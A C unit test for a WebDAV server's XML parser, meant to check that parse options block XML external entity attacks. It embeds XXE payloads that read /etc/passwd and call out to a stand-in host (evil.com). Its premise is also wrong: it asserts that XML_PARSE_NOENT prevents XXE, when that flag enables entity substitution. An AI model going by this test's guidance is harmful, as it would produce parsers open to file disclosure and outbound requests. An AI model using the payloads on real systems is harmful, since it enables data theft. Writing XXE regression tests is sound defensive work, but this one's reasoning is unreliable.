#include <check.h>
#include <stdlib.h>
#include <libxml/parser.h>
#include <libxml/tree.h>

/*
 * The kXMLParseOptions used by GCDWebDAVServer must include XML_PARSE_NOENT
 * and XML_PARSE_NONET to prevent XXE attacks. We verify this by including
 * the header that defines kXMLParseOptions and checking the flags directly.
 * Since kXMLParseOptions is defined in the .m file, we replicate the check
 * by parsing XXE payloads with the options that SHOULD be used and confirming
 * external entities are not resolved.
 */

/* Import the parse options as defined in the production code */
#include "pkg/apple/WebServer/GCDWebDAVServer/GCDWebDAVServer.m"

START_TEST(test_xxe_prevention_in_xml_parse_options)
{
    /* Invariant: kXMLParseOptions MUST include XML_PARSE_NOENT and XML_PARSE_NONET
       to prevent external entity resolution and network access */

    /* Check that the flags are set */
    ck_assert_msg((kXMLParseOptions & XML_PARSE_NOENT) != 0,
        "kXMLParseOptions must include XML_PARSE_NOENT to prevent XXE");
    ck_assert_msg((kXMLParseOptions & XML_PARSE_NONET) != 0,
        "kXMLParseOptions must include XML_PARSE_NONET to block network entity fetches");

    /* Adversarial payloads that must not resolve entities */
    const char *payloads[] = {
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><D:propfind xmlns:D=\"DAV:\"><D:prop><D:resourcetype/></D:prop></D:propfind>",
    };
    int num_payloads = sizeof(payloads) / sizeof(payloads[0]);

    for (int i = 0; i < num_payloads; i++) {
        xmlDocPtr doc = xmlReadMemory(payloads[i], (int)strlen(payloads[i]),
                                      NULL, NULL, kXMLParseOptions);
        if (doc) {
            xmlNodePtr root = xmlDocGetRootElement(doc);
            if (root && root->children && root->children->content) {
                /* Content must NOT contain resolved file contents */
                ck_assert_msg(strstr((char *)root->children->content, "root:") == NULL,
                    "XXE entity was resolved - file contents leaked");
            }
            xmlFreeDoc(doc);
        }
    }
}
END_TEST

Suite *security_suite(void)
{
    Suite *s;
    TCase *tc_core;

    s = suite_create("Security");
    tc_core = tcase_create("Core");

    tcase_add_test(tc_core, test_xxe_prevention_in_xml_parse_options);
    suite_add_tcase(s, tc_core);

    return s;
}

int main(void)
{
    int number_failed;
    Suite *s;
    SRunner *sr;

    s = security_suite();
    sr = srunner_create(s);

    srunner_run_all(sr, CK_NORMAL);
    number_failed = srunner_ntests_failed(sr);
    srunner_free(sr);

    return (number_failed == 0) ? EXIT_SUCCESS : EXIT_FAILURE;
}